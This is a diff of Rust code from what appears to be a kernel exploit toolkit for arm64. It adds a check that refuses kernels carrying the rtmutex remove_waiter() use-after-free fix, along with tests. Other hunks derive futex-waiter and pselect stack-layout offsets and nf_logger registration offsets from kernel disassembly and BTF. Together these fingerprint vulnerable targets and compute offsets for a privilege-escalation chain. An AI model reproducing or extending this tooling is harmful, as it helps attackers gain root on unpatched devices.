@@ -61,6 +61,64 @@ fn disassemble_symbol(
     disassemble_range(kernel, start, stop)
 }
 
+/// reject kernels that include the rtmutex
+/// remove_waiter() fix before offset extraction.
+pub fn ensure_rtmutex_43499_unpatched(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted_offsets: &[u64],
+) -> Result<u64> {
+    let start = unique_offset_optional(symbols, "remove_waiter")
+        .ok_or_else(|| ExtractError::new("cannot check: remove_waiter is not in kallsyms"))?;
+    let cap = OBJDUMP_CAP as u64;
+    let stop = (start + cap).min(
+        sorted_offsets
+            .iter()
+            .find(|off| **off > start)
+            .map_or(start + cap, |off| *off),
+    );
+    let dis = disassemble_range(kernel, start as usize, stop as usize)?;
+    if remove_waiter_uses_current(&dis) {
+        return Ok(start);
+    }
+    Err(ExtractError::already_fixed(format!(
+        "remove_waiter()@{start:#x} never reads current (no mrs sp_el0); \
+         rtmutex UAF fix is present"
+    )))
+}
+
+/// True when `remove_waiter()` still operates on `current` (vulnerable):
+/// the fixed variant no longer contains `mrs xN, sp_el0`.
+pub fn remove_waiter_uses_current(dis: &[String]) -> bool {
+    let mrs_current = Regex::new(r"(?i)\bmrs\s+x\d+,\s*s3_0_c4_c1_0\b").unwrap();
+    dis.iter().any(|line| mrs_current.is_match(line))
+}
+
+#[cfg(test)]
+mod tests {
+    use super::remove_waiter_uses_current;
+
+    #[test]
+    fn patched_remove_waiter_never_reads_current() {
+        let dis = vec![
+            "0106f91c: ldr x20, [x23, #0x50]".to_string(),
+            "0106f964: str xzr, [x20, #0x938]".to_string(),
+            "0106fae8: mov x5, x20".to_string(),
+        ];
+        assert!(!remove_waiter_uses_current(&dis));
+    }
+
+    #[test]
+    fn vulnerable_remove_waiter_reads_current() {
+        let dis = vec![
+            "01068de0: mrs x20, s3_0_c4_c1_0".to_string(),
+            "01068e2c: mov x0, x21".to_string(),
+            "01068e30: str xzr, [x20, #0x938]".to_string(),
+        ];
+        assert!(remove_waiter_uses_current(&dis));
+    }
+}
+
 pub struct PselectLayout {
     pub shift: u64,
     pub waiter_local: u64,
@@ -182,14 +240,14 @@ pub fn derive_pselect_layout(
     let mut waiter_candidates: Vec<(String, u64)> = Vec::new();
     for (reg, imm) in add_sp_immediates(&dis["futex_wait"]) {
         if pi_tree != 0 {
-            let re = Regex::new(&format!(r"(?i)\badd\s+x\d+,\s*{reg},\s*#0x{pi_tree:x}\b"))
-                .unwrap();
+            let re =
+                Regex::new(&format!(r"(?i)\badd\s+x\d+,\s*{reg},\s*#0x{pi_tree:x}\b")).unwrap();
             if dis["futex_wait"].iter().any(|line| re.is_match(line)) {
                 waiter_candidates.push((reg, imm));
             }
         } else {
-            let re = Regex::new(&format!(r"(?i)\bstp\s+xzr,\s*xzr,\s*\[sp,\s*#0x{imm:x}\]"))
-                .unwrap();
+            let re =
+                Regex::new(&format!(r"(?i)\bstp\s+xzr,\s*xzr,\s*\[sp,\s*#0x{imm:x}\]")).unwrap();
             if dis["futex_wait"].iter().any(|line| re.is_match(line)) {
                 waiter_candidates.push((reg, imm));
             }
@@ -244,7 +302,10 @@ pub fn derive_pselect_layout(
         }
     }
     if buffer_candidates.len() != 1 {
-        let hex: Vec<String> = buffer_candidates.iter().map(|v| format!("{v:#x}")).collect();
+        let hex: Vec<String> = buffer_candidates
+            .iter()
+            .map(|v| format!("{v:#x}"))
+            .collect();
         return Err(ExtractError::new(format!(
             "core_sys_select fd_set buffer candidates not unique: {hex:?}"
         )));
@@ -285,9 +346,15 @@ pub fn derive_pselect_layout(
         )));
     }
 
-    let frame_sum: u64 = pselect_chain.iter().map(|key| frames[&format!("frame_{key}")]).sum();
+    let frame_sum: u64 = pselect_chain
+        .iter()
+        .map(|key| frames[&format!("frame_{key}")])
+        .sum();
     let pselect_word0 = -(frame_sum as i64) + pselect_buffer as i64;
-    let futex_sum: u64 = futex_chain.iter().map(|key| frames[&format!("frame_{key}")]).sum();
+    let futex_sum: u64 = futex_chain
+        .iter()
+        .map(|key| frames[&format!("frame_{key}")])
+        .sum();
     let futex_waiter = -(futex_sum as i64) + *waiter_local as i64;
     let delta = futex_waiter - pselect_word0;
     if delta < 0 || delta % 8 != 0 {
@@ -372,9 +439,7 @@ pub fn derive_nf_logger_registration(
         .field("nf_logger", "type")
         .ok_or_else(|| ExtractError::new("BTF nf_logger.type missing"))?;
     if btf.direct_field_size("nf_logger", "type") != Some(4) {
-        return Err(ExtractError::new(
-            "BTF nf_logger.type is not a 4-byte enum",
-        ));
+        return Err(ExtractError::new("BTF nf_logger.type is not a 4-byte enum"));
     }
     let logger_type = u32_at(kernel, logger + type_off as u64)?;
     let ulog_value = btf
@@ -461,17 +526,13 @@ pub fn derive_nf_logger_registration(
         )));
     }
     let (slot_reg, _) = &deduped[0];
-    let stlr_re = Regex::new(&format!(
-        r"(?i)\bstlr\s+{logger_reg},\s*\[{slot_reg}\]"
-    ))
-    .unwrap();
+    let stlr_re = Regex::new(&format!(r"(?i)\bstlr\s+{logger_reg},\s*\[{slot_reg}\]")).unwrap();
     if !register_text.iter().any(|line| stlr_re.is_match(line)) {
         return Err(ExtractError::new(
             "nf_log_register does not store the logger to the slot",
         ));
     }
-    let bound_re = Regex::new(&format!(r"(?i)\bcmp\s+w{type_reg},\s*#0x{max_value:x}\b"))
-        .unwrap();
+    let bound_re = Regex::new(&format!(r"(?i)\bcmp\s+w{type_reg},\s*#0x{max_value:x}\b")).unwrap();
     if !register_text.iter().any(|line| bound_re.is_match(line)) {
         return Err(ExtractError::new(
             "nf_log_register type bound not closed with NF_LOG_TYPE_MAX",
